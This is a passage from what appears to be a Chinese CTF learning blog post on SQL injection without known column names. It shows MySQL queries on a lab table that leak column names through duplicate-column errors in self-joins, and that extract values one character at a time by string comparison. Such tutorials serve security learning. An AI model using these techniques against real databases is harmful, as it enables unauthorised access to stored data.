+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select * from users as a join users as b)a;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br></pre></td></tr></table></figure>
+<p>​	这里发现，报错了，并且还是字段名重复的错误，<strong>注：括号外面必须得加上任意字母，否则会报 ERROR 1248 (42000): Every derived table must have its own alias 的错误</strong>，因此，则可以使用这种方式获得所有的列名，不过前提还是得用<strong> InnoDb 引擎</strong>来获取数据库名以及表名。</p>
+<p>​	根据上面的那个可以知道的是，其中一个字段的名字，但是，flag 或许并不在这个字段里，那么，就需要想点办法获得下一个字段的名字了，不过，在那之前，得先排除掉已经知道的字段名的干扰，可以使用如下方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users as a join users as b using(username);</span><br><span class="line">+----------+-----------+-----------------------------------+-----------+-----------------------------------+</span><br><span class="line">| username | password  | flag                              | password  | flag                              |</span><br><span class="line">+----------+-----------+-----------------------------------+-----------+-----------------------------------+</span><br><span class="line">| xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class="line">+----------+-----------+-----------------------------------+-----------+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>​	看看上面的内容，发现在增加了一个 **using (username)** 之后，username 这个字段似乎奇迹般地没了，<strong>不过这里我不是很清楚原理是什么，不过，暂时能用就行，记录一下，以后有机会学到了这里再进行补充</strong>。那么，到了这个时候，重复的字段就只有 password 和 flag 了，于是，再用如下的语句进行查询看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select * from users as a join users as b using(username))a;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;password&#x27;</span><br></pre></td></tr></table></figure>
+<p>​	成功查询到了 password 这个字段名，紧接着，将 password 加入 using () 函数中，如下，即可拿到 flag 字段的字段名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select * from users as a join users as b using(username,password))a;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;flag&#x27;</span><br></pre></td></tr></table></figure>
+<p>​	最后一步，如果将 flag 再填进 using () 函数中呢？会出现如下情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select * from users as a join users as b using(username,password,flag))a;</span><br><span class="line">+----------+-----------+-----------------------------------+</span><br><span class="line">| username | password  | flag                              |</span><br><span class="line">+----------+-----------+-----------------------------------+</span><br><span class="line">| xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class="line">+----------+-----------+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>​	内容被成功查询出来了，之后再怎么办就得根据题目的实际情况决定了，成功了！！！  <strong>(p≧w≦q)</strong></p>
+<h2 id="无列名注入ascii位偏移"><a class="markdownIt-Anchor" href="#无列名注入ascii位偏移">#</a> 无列名注入–ascii 位偏移：</h2>
+<p>​	这个方法，是有点类似于 sql 盲注的爆破的，利用的是字符串进行比较是按位置进行比较，从最开始的那个开始，一位一位地比较，因此，当得到数据库名以及表名之后，则可以进行如下操作：</p>
+<p>​	不过这种方法有个前提，就是需要表内只有一个字段，不然只能获取到第一个字段的字段名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users;</span><br><span class="line">+----------+</span><br><span class="line">| username |</span><br><span class="line">+----------+</span><br><span class="line">| xiaomi   |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>​	首先可以知道的是，username 中的内容是 xiaomi，因此，用如下方式可以进行比对：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select &#x27;x&#x27;)&gt;(select username from users);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| (select &#x27;x&#x27;)&gt;(select username from users) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">|                                         0 |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select &#x27;y&#x27;)&gt;(select username from users);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| (select &#x27;y&#x27;)&gt;(select username from users) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">|                                         1 |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>​	<strong>因为我这里存在三个字段，所以这里只有指定一下某个表进行查询</strong>。显而易见，在第一行中，我们用 x 进行对比，返回结果为 0，对比 y 的时候返回结果为 1，也就是说，这个字段的内容的第一位为 x，接下来进行后续的对比：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select &#x27;xi&#x27;)&gt;(select username from users);</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| (select &#x27;xi&#x27;)&gt;(select username from users) |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">|                                          0 |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select &#x27;xj&#x27;)&gt;(select username from users);</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| (select &#x27;xj&#x27;)&gt;(select username from users) |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">|                                          1 |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>​	后续的查询操作也就很明显了，当然，这里如果合适的话其实可以利用 python 写个爬虫来进行查询的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select &#x27;xiaomia&#x27;)&gt;(select username from users);</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| (select &#x27;xiaomia&#x27;)&gt;(select username from users) |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">|                                               1 |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>​	当然，如果查询到最后一个，在这里也就是 xiaomi 的第二个 i 的之后，如果再对后面进行对比的时候无论如何也是 1，<strong>这里我做一个猜测，应该是因为字符串的结尾是以 \x00 结尾，因此，每一个可显示字符都要比这个字符大。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ect &#x27;xiaomia&#x27;)&gt;(select username from users);</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| (select &#x27;xiaomia&#x27;)&gt;(select username from users) |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">|                                               1 |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>​	当然，如果查询到最后一个，在这里也就是 xiaomi 的第二个 i 的之后，如果再对后面进行对比的时候无论如何也是 1，<strong>这里我做一个猜测，应该是因为字符串的结尾是以 \x00 结尾，因此，每一个可显示字符都要比这个字符大。</strong></p>
+<p>​	好了，ascii 位偏移的无列名注入也说完了！！！ <strong>(p≧w≦q)</strong></p>
+
+      <div class="tags">
+          <a href="/tags/Web/" rel="tag"><i class="ic i-tag"></i> Web</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2024-06-20 21:27:12" itemprop="dateModified" datetime="2024-06-20T21:27:12+08:00">2024-06-20</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="g01den 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="g01den 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://blog.g01den.top/posts/384200ef.html" title="SQL无列名注入">http://blog.g01den.top/posts/384200ef.html</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/posts/52965aaa.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture131.png" title="pwn学习笔记（4）ret2libc">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Pwn手的自我修养</span>
+  <h3>pwn学习笔记（4）ret2libc</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/posts/a698ff8.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture281.jpg" title="pwn学习笔记（5）--格式化字符串漏洞（未完全完成）">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Pwn手的自我修养</span>
+  <h3>pwn学习笔记（5）--格式化字符串漏洞（未完全完成）</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> SQL 无列名注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E-information_schema-%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.</span> <span class="toc-text"> 关于 information_schema 数据库：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Einnodb%E5%BC%95%E6%93%8E"><span class="toc-number">1.2.</span> <span class="toc-text"> 关于 InnoDb 引擎：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Esys%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.3.</span> <span class="toc-text"> 关于 sys 数据库：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5union"><span class="toc-number">1.4.</span> <span class="toc-text"> 无列名注入–union：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A1%88%E4%BE%8Bbuuctf-swpu2019web1"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 题目案例–BUUCTF----[SWPU2019] Web1：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.2.1.</span> <span class="toc-text"> 什么是二次注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.2.2.</span> <span class="toc-text"> 二次注入的原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%A7%E7%BB%AD%E5%81%9A%E9%A2%98"><span class="toc-number">1.4.2.3.</span> <span class="toc-text"> 继续做题：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5join"><span class="toc-number">1.5.</span> <span class="toc-text"> 无列名注入–join：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5ascii%E4%BD%8D%E5%81%8F%E7%A7%BB"><span class="toc-number">1.6.</span> <span class="toc-text"> 无列名注入–ascii 位偏移：</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li class="active"><a href="/posts/384200ef.html" rel="bookmark" title="SQL无列名注入">SQL无列名注入</a></li><li><a href="/posts/88915f6f.html" rel="bookmark" title="无参数RCE的一些奇技淫巧">无参数RCE的一些奇技淫巧</a></li><li><a href="/posts/2f610211.html" rel="bookmark" title="反弹shell">反弹shell</a></li><li><a href="/posts/ff5b88d5.html" rel="bookmark" title="python原型链污染">python原型链污染</a></li><li><a href="/posts/97a7dff3.html" rel="bookmark" title="ctfshow-信息搜集">ctfshow-信息搜集</a></li><li><a href="/posts/53e2b2e1.html" rel="bookmark" title="ctfshow-命令执行">ctfshow-命令执行</a></li><li><a href="/posts/4fb535d6.html" rel="bookmark" title="ctfshow-反序列化">ctfshow-反序列化</a></li><li><a href="/posts/b856856d.html" rel="bookmark" title="ctfshow-ssrf">ctfshow-ssrf</a></li><li><a href="/posts/ad175165.html" rel="bookmark" title="ctfshow-文件包含">ctfshow-文件包含</a></li><li><a href="/posts/4826d2ce.html" rel="bookmark" title="ctfshow-SSTI">ctfshow-SSTI</a></li><li><a href="/posts/2d792864.html" rel="bookmark" title="Python栈帧逃逸">Python栈帧逃逸</a></li><li><a href="/posts/b3ad4123.html" rel="bookmark" title="有小考点的Web题">有小考点的Web题</a></li><li><a href="/posts/a4378bd0.html" rel="bookmark" title="【2025】LitCTF">【2025】LitCTF</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="g01den"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">g01den</p>
+  <div class="description" itemprop="description">golden的部落阁</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">49</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">10</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/posts/52965aaa.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/posts/a698ff8.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/b3ad4123.html" title="有小考点的Web题">有小考点的Web题</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/ad175165.html" title="ctfshow-文件包含">ctfshow-文件包含</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/efb4c08.html" title="pwn学习笔记（7）--堆相关源码">pwn学习笔记（7）--堆相关源码</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/53e2b2e1.html" title="ctfshow-命令执行">ctfshow-命令执行</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/ff5b88d5.html" title="python原型链污染">python原型链污染</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/b856856d.html" title="ctfshow-ssrf">ctfshow-ssrf</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Misc/" title="分类于 杂七杂八的知识点">杂七杂八的知识点</a>
+</div>
+
+    <span><a href="/posts/d63a55bd.html" title="BUUCTF-Misc-第一页(1-16)">BUUCTF-Misc-第一页(1-16)</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/cbafa55d.html" title="pwn学习笔记（6）--堆基础概述">pwn学习笔记（6）--堆基础概述</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/97a7dff3.html" title="ctfshow-信息搜集">ctfshow-信息搜集</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/4fb535d6.html" title="ctfshow-反序列化">ctfshow-反序列化</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: 'posts/384200ef.html',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+</html>
